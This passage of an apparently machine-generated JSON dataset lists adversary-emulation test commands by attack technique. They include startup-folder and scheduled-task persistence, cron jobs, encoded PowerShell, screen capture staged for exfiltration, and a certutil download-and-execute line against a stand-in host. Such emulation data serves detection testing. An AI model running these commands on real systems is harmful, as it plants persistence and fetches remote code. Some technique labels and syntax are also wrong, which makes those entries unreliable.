      "tactic": "Persistence",
      "platform": "windows",
      "command": "powershell -Command \"try { $vbsContent = 'Dim objShell : Set objShell = CreateObject(\"WScript.Shell\") : objShell.Popup \"Scheduled task completed.\", 0, \"Status\", 0'; $startup = [System.Environment]::GetFolderPath('Startup'); $path = Join-Path $startup 'task.vbs'; $vbsContent | Out-File -FilePath $path -Encoding ASCII -Force } catch { exit 1 }\"",
      "description": "PowerShell command that writes a VBScript to the startup folder using environment-aware path resolution. The script shows a benign message on login.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell executes and creates 'task.vbs' in the current user's startup directory. The script runs at login and displays a harmless message. Uses proper error handling and built-in .NET methods only through safe PowerShell cmdlets and environment calls.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.847611",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.667,
      "validated": true
    },
    {
      "id": "7d445d15-10bc-46a0-8ed2-1af12ae6e325",
      "ttp_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_name": "Data from Local System",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"(Get-WmiObject -Class Win32_PingStatus -Filter \\\"Address='example.com'\\\" | Select-Object StatusCode, ResponseTime)\"",
      "description": "Basic WMI ping using Win32_PingStatus to check reachability of example.com",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends an ICMP echo request to example.com via WMI and returns StatusCode (0 for success) and ResponseTime in milliseconds",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.848189",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "bdcf9fd7-0e75-45cb-8a8b-330caa80ca5c",
      "ttp_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_name": "Data from Local System",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"try { $ping = Get-CimInstance -ClassName Win32_PingStatus -Filter \\\"Address='example.com' Timeout=5000\\\"; if ($ping.StatusCode -eq 0) { Write-Output \\\"Ping successful: $($ping.ResponseTime)ms\\\" } else { Write-Output \\\"Ping failed with code $($ping.StatusCode)\\\" } } catch { Write-Error \\\"WMI ping failed: $_\\\" }\"",
      "description": "Intermediate WMI ping using Get-CimInstance with error handling and timeout",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Uses modern CIM cmdlet to ping example.com with 5-second timeout, outputs formatted result or error message",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.848189",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "36a108ca-df74-4b4d-a647-c96b4dd8fb29",
      "ttp_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_name": "Data from Local System",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -EncodedCommand \"RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIAAtAEMAbABhAHMAcwBOAGEAbQBlACAAVwBpAG4AMwAyAF8AUABpAG4AZwBTAHQAYQB0AHUAcwAgAC0ARgBpAGwAdABlAHIAIAAiAEEAZABkAHIAZQBzAHMAJwBlAHgAYQBtAHAAbABlAC4AYwBvAG0AJwAgAFQAbwBpAG0AZQBvAHUAPQA1ADAAMAAwACIAIAAkAGMAbwBtAHAATwBiAGoAPQAkAEwAYQBzAHQARQByAHIAbwByADsAIABpAGYAIAAoACQAYwBvAG0AcABPAGIAagApACAAewAgAFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACIAVwBNAEkAIABwAGkAbgBnACAAZgBhAGkAbABlAGQAOgAgACQAYwBvAG0AcABPAGIAagAuAEUAcgByAG8AcgBtAGUAcwBzAGEAZwBlACIAIAAoAFsAUwB0AHIAaQBuAGcAXQAoACQAYwBvAG0AcABPAGIAagAuAEUAcgByAG8AcgBtAGUAcwBzAGEAZwBlACkAKQB9AGUAbABzAGUAewAgAGkAZgAgACgAJABwAGkAbgBnAC4AUwB0AGEAdAB1AHMAQwBvAGQAZQAgAC0AZQBxACAAMAApACAAewAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgBQAGkAbgBnACAAcwB1AGMAAYwBlAHMAcwBmAHUAbAA6ACAAJAAoAHAAaQBuAGgALgBSAGUAcwBwAG8AbgBzAGUAVABpAG0AZQApAG0AcwAiAH0AIABlAGwAcwBlAHsAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAUABpAG4AZwAgAGYAYQBpAGwAZQBkACAAdwBpAHQAaAAgAGMAbwBkAGUAIABbAF0APwAiAH0AfQA=\"",
      "description": "Advanced: Base64-encoded WMI ping command using Get-CimInstance with error handling and obfuscation",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Decodes and executes a PowerShell script that pings example.com via WMI, handles errors, and outputs result; simulates obfuscated command execution",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.848189",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "c777cfba-cd18-481a-9f91-f46a8e68a859",
      "ttp_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_name": "Data from Local System",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ping -c 4 example.com",
      "description": "Basic ping command to test connectivity to a remote host with 4 packets.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends 4 ICMP echo requests to example.com and displays response times. Exits normally after completion.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.691672",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "29f2ec36-8106-4c98-a3f4-1fbf61df541f",
      "ttp_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_name": "Data from Local System",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ping -c 2 -s 1000 example.com",
      "description": "Intermediate ping command with reduced packet count and increased packet size to test network performance or evade simple detection.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends 2 ICMP packets of 1000 bytes each to example.com. Useful for testing if larger packets are filtered or delayed.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.691672",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "406cc07d-4864-427c-b043-12e81460caf8",
      "ttp_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
      "technique_name": "Data from Local System",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ping -c 5 -i 0.2 example.com",
      "description": "Advanced ping command with rapid packet transmission (every 0.2 seconds) to perform a quick sweep of a host.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends 5 ICMP packets rapidly (every 200ms) to example.com. May be used to quickly assess host responsiveness under load.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.691672",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.662,
      "validated": true
    },
    {
      "id": "38bfd2ec-309b-4ee7-97bc-dcd209c71927",
      "ttp_id": "a9aab504-5a9b-4139-a84a-b7ad290334d2",
      "technique_id": "a9aab504-5a9b-4139-a84a-b7ad290334d2",
      "technique_name": "Windows Management Instrumentation",
      "tactic": "Execution",
      "platform": "windows",
      "command": "wmic process call create \"cmd.exe /c echo test > %TEMP%\\wmi_test.txt\"",
      "description": "Basic WMI command execution using wmic to create a process that writes a test file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a new process via WMI that runs 'cmd.exe /c echo test > %TEMP%\\wmi_test.txt'. A file named wmi_test.txt will be created in the user's temp directory containing the word 'test'.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:17.355970",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "86efa3e2-1df8-4ec5-b7e3-573953a669e5",
      "ttp_id": "a9aab504-5a9b-4139-a84a-b7ad290334d2",
      "technique_id": "a9aab504-5a9b-4139-a84a-b7ad290334d2",
      "technique_name": "Windows Management Instrumentation",
      "tactic": "Execution",
      "platform": "windows",
      "command": "wmic /namespace:\\\\root\\cimv2 path Win32_Process startup \"{ 'CommandLine': 'cmd.exe /c ping 127.0.0.1 -n 5 > nul' }\"; echo. > %TEMP%\\wmi_intermediate.log",
      "description": "Intermediate use of WMI to create a temporary process instance with custom startup command, simulating stealthier execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Uses wmic with namespace and path to invoke a process creation via the Startup method (simulated). No actual persistence is created, but the command structure mimics advanced WMI usage. A log file is created in temp to indicate execution.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:17.355970",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "08a385e1-1068-4620-a7f4-7c41ffcd30c7",
      "ttp_id": "a9aab504-5a9b-4139-a84a-b7ad290334d2",
      "technique_id": "a9aab504-5a9b-4139-a84a-b7ad290334d2",
      "technique_name": "Windows Management Instrumentation",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \" $cmd = 'echo Hello from WMI encoded'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); $encoded = [Convert]::ToBase64String($bytes); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"\"\"cmd.exe /c echo $encoded && powershell -EncodedCommand $encoded\"\"\" \"",
      "description": "Advanced WMI execution via PowerShell using encoded command to obfuscate intent, simulating real-world stealth techniques.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Uses PowerShell to encode a benign command and then invokes WMI process creation via Invoke-WmiMethod with the encoded command. This simulates how attackers might use WMI with obfuscation. Output will be visible in console if run interactively, but no harmful payload is executed.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:17.355970",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "02de3ace-bd61-42ba-9840-f5ac35a4d3d8",
      "ttp_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "cmd.exe /c \"echo test data > %TEMP%\\sensitive.txt && powershell -Command \\\"Compress-Archive -Path '%TEMP%\\sensitive.txt' -DestinationPath '%TEMP%\\data.zip' -Force\\\"\"",
      "description": "Creates a test file and archives it using PowerShell Compress-Archive",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named sensitive.txt is created in the temp directory, then compressed into data.zip using built-in PowerShell compression. The original file remains unless explicitly deleted.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.834877",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "ef1b4e11-a52a-4628-b5f9-5f27a34ddea1",
      "ttp_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\exfil_staging' -ErrorAction SilentlyContinue; Set-Content -Path '%TEMP%\\exfil_staging\\config.bak' -Value 'dummy config data'; certutil -encode '%TEMP%\\exfil_staging\\config.bak' '%TEMP%\\exfil_staging\\config.enc'; Compress-Archive -Path '%TEMP%\\exfil_staging\\*' -DestinationPath '%TEMP%\\staged_data.zip' -Force\"",
      "description": "Stages multiple files in a directory, encodes one with certutil, then archives the entire folder",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A staging directory is created in temp, a dummy config file is written, encoded to base64 using certutil, and then all files in the staging folder are compressed into staged_data.zip. This simulates preparation and bundling of collected data.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.834877",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "4af79754-3303-4dad-ac77-9b83a10f2559",
      "ttp_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "cmd.exe /c \"(echo off & mkdir \\\"%TEMP%\\\\_archive\\\" 2>NUL) && (echo dummy log data > \\\"%TEMP%\\\\_archive\\\\log1.txt\\\") && (echo error report > \\\"%TEMP%\\\\_archive\\\\report.txt\\\") && powershell -Command \\\"try { Compress-Archive -Path '%TEMP%\\\\_archive\\\\*' -DestinationPath '%TEMP%\\\\collected_data.zip' -Force } catch { exit 1 }\\\" && echo Archived successfully\"",
      "description": "Advanced batch-style command that creates multiple dummy files and archives them with error handling",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a hidden-like staging folder with multiple dummy files, then uses PowerShell to compress them into collected_data.zip with error trapping. Simulates real-world data aggregation before exfiltration.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:48:52.835883",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "0c844298-59be-4b4e-aa4a-6e61fbabb8cd",
      "ttp_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "tar -cf $HOME/collected_data.tar $HOME/documents/report.txt",
      "description": "Creates a tar archive of a single collected file using basic archiving.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A tar archive named 'collected_data.tar' is created in the user's home directory containing the specified file. No errors occur if the source file exists.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.690660",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "0e77f5eb-cb69-4b20-b607-6ba232863a32",
      "ttp_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "tar -czf $HOME/staged_exfil.tgz -C $HOME/logs .",
      "description": "Compresses all files in the logs directory into a gzipped tar archive for staging exfiltration.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A compressed archive 'staged_exfil.tgz' is created in the home directory containing all files from the 'logs' subdirectory. Safe if logs are user-generated.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.690660",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "3ac0fed9-5833-4ff4-9f1c-21131b4e2107",
      "ttp_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "find $HOME/research -name '*.pdf' -type f -exec tar -rf $HOME/archive_temp.tar {} \\+ && gzip $HOME/archive_temp.tar",
      "description": "Finds all PDF files in a specific directory and appends them to a tar archive, then compresses it with gzip.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Locates PDFs in the research directory, bundles them into an archive, and compresses it into 'archive_temp.tar.gz'. Uses common collection and archiving pattern without recursion into system directories.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.690660",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "ce768beb-03e8-419f-8c89-0f767f283b40",
      "ttp_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
      "technique_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
      "technique_name": "Scheduled Task/Job",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "schtasks /create /tn \"UpdateCheck\" /tr \"cmd.exe /c echo Task running > \"%TEMP%\\update.log\"\" /sc hourly /f",
      "description": "Creates a basic scheduled task using schtasks.exe that runs hourly and logs execution to a file in %TEMP%",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A scheduled task named 'UpdateCheck' is created and will execute hourly, writing 'Task running' to %TEMP%\\update.log. No elevated privileges required for user-level task.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:08.803679",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "91ab5741-01f2-49dd-9d2d-17ba0eae705f",
      "ttp_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
      "technique_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
      "technique_name": "Scheduled Task/Job",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "schtasks /create /tn \"SystemSync\" /tr \"powershell -Command \\\"& { echo 'Sync executed' | Out-File -FilePath '$env:APPDATA\\sync.log' }\\\"\" /sc onstart /ru SYSTEM /f",
      "description": "Creates a scheduled task that runs at system startup under SYSTEM account using PowerShell command",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A scheduled task named 'SystemSync' is created to run at system startup as SYSTEM, appending 'Sync executed' to $env:APPDATA\\sync.log. Requires admin privileges to register a SYSTEM task.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:08.803679",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "091e05a8-30a0-4f05-92ea-51659689e11a",
      "ttp_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
      "technique_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
      "technique_name": "Scheduled Task/Job",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "schtasks /create /tn \"\\Microsoft\\Windows\\Diagnosis\\ScheduledScan\" /xml \"%TEMP%\\malicious_task.xml\" /f",
      "description": "Creates a hidden scheduled task in a legitimate Windows task folder using XML import to blend in with system tasks",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A scheduled task is created in a protected system task directory using XML import, which can be used to hide malicious tasks. Requires admin privileges and a pre-created XML file at %TEMP%\\malicious_task.xml. This technique mimics living-off-the-land behavior but is high risk due to system task namespace abuse.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:08.803679",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "6d6f224b-42c8-4f10-802d-0b744774a761",
      "ttp_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
      "technique_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
      "technique_name": "Scheduled Task/Job",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "(crontab -l 2>/dev/null; echo \"*/5 * * * * echo 'Hello from cron' >> $HOME/cron_test.log\") | crontab -",
      "description": "Adds a user\u2011level cron job that runs every 5 minutes and appends a test message to ~/cron_test.log.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The cron daemon will execute the echo command every 5 minutes, creating or updating the file $HOME/cron_test.log with the test string.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:59:05.902780",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "ed7de517-5986-4a54-85a1-46aad1980f17",
      "ttp_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
      "technique_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
      "technique_name": "Scheduled Task/Job",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo \"0 2 * * * root echo 'Root cron job' >> /var/log/root_cron_test.log\" | sudo tee /etc/cron.d/root_test > /dev/null",
      "description": "Creates a system\u2011wide cron file in /etc/cron.d that runs daily at 02:00 as root and logs a test message.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "At 02:00 each day, the cron daemon executes the echo command as root, appending the message to /var/log/root_cron_test.log.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:59:05.902780",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "94bf8d89-c85a-4103-8cb3-8a614a0a5dde",
      "ttp_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_name": "Screen Capture",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen(0, 0, 0, 0, $screen.Size); $path = '$env:TEMP\\\\screen_capture_test.png'; $bitmap.Save($path); $graphics.Dispose(); $bitmap.Dispose();\"",
      "description": "Basic screen capture using PowerShell and .NET Windows Forms to save a screenshot to the temp directory.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A single screenshot of the primary monitor is saved as 'screen_capture_test.png' in the user's temp directory. The script uses built-in .NET assemblies via PowerShell Add-Type, which is available by default on Windows.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.991563",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "1fe967f7-16f4-4b6c-a31a-e484c6a107aa",
      "ttp_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_name": "Screen Capture",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"try { Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screens = [System.Windows.Forms.Screen]::AllScreens; for ($i = 0; $i -lt $screens.Length; $i++) { $bounds = $screens[$i].Bounds; $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $path = '$env:TEMP\\\\screen_capture_multi_{$i}.png'; $bitmap.Save($path); $graphics.Dispose(); $bitmap.Dispose(); } } catch { }\"",
      "description": "Intermediate screen capture that captures all connected displays and saves each as a separate file in the temp directory.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Takes screenshots of all connected screens and saves them as numbered PNG files (e.g., screen_capture_multi_0.png) in the temp folder. Uses error suppression to avoid breaking on failures.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.991563",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "62a5ed5e-8482-44e8-975d-41f2974f5f7d",
      "ttp_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_name": "Screen Capture",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"$output = '$env:TEMP\\\\screen_capture_encoded.b64'; try { Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen(0, 0, 0, 0, $screen.Size); $ms = New-Object System.IO.MemoryStream; $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); $bytes = $ms.ToArray(); $ms.Close(); $encoded = [Convert]::ToBase64String($bytes); Set-Content -Path $output -Value $encoded -Force; $graphics.Dispose(); $bitmap.Dispose(); } catch { }\"",
      "description": "Advanced screen capture that saves the screenshot as a Base64-encoded string in a text file for exfiltration simulation.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Captures the primary screen and saves the image as a Base64 string in 'screen_capture_encoded.b64' in the temp directory. This simulates data staging for exfiltration. Uses -Force only with Set-Content, as allowed.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.991563",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "4501bc18-f71e-4159-bbd6-607c5587bc9f",
      "ttp_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_name": "Screen Capture",
      "tactic": "Collection",
      "platform": "linux",
      "command": "import -window root $HOME/screenshot_basic.png",
      "description": "Basic screen capture using ImageMagick 'import' to capture the entire screen and save as PNG in user's home directory.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Takes a full-screen screenshot and saves it as screenshot_basic.png in the user's home directory. Requires X11 and ImageMagick.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:18.987202",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "d71c8561-a94d-446c-bbcc-b79ae59eed92",
      "ttp_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_name": "Screen Capture",
      "tactic": "Collection",
      "platform": "linux",
      "command": "gnome-screenshot -f $TMP/screenshot_intermediate.png",
      "description": "Intermediate screen capture using gnome-screenshot to save the screenshot to a temporary directory.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Captures the current desktop screen and saves it as screenshot_intermediate.png in the system temporary directory. Requires GNOME desktop environment.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:18.987202",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "8728e6d9-c410-410e-b43d-98b66b4a49d8",
      "ttp_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
      "technique_name": "Screen Capture",
      "tactic": "Collection",
      "platform": "linux",
      "command": "ffmpeg -f x11grab -video_size 1280x800 -i $DISPLAY -frames 1 $TMP/screenshot_advanced.png && gzip $TMP/screenshot_advanced.png",
      "description": "Advanced screen capture using ffmpeg to grab the screen, then compress the output to reduce size and potentially evade detection.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Captures one frame from the X11 display and saves it as a PNG, then compresses the file using gzip. Requires ffmpeg and X11 environment.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:18.987202",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "f5195f41-cd29-4498-ba36-0b845a3c3a65",
      "ttp_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "windows",
      "command": "cmd.exe /c echo calc.exe > \"%TEMP%\\update.bat\" && \"%TEMP%\\update.bat\"",
      "description": "Basic user execution via a batch file written to temp directory and executed.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a batch file in %TEMP% that runs calc.exe, then executes it. Calculator should open.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:08.803165",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "06b35a64-5fd3-4e18-83cb-7d9d7876befc",
      "ttp_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://example.com/malicious.bat \"%TEMP%\\malicious.bat\" && cmd.exe /c \"%TEMP%\\malicious.bat\"",
      "description": "Intermediate: Downloads a batch file using certutil (built-in) and executes it.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from a benign URL (fails safely) and execute it. No actual payload is retrieved; used for detection pattern simulation.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:08.803165",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "76c77a70-98eb-445e-b297-4d796c0a9a90",
      "ttp_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
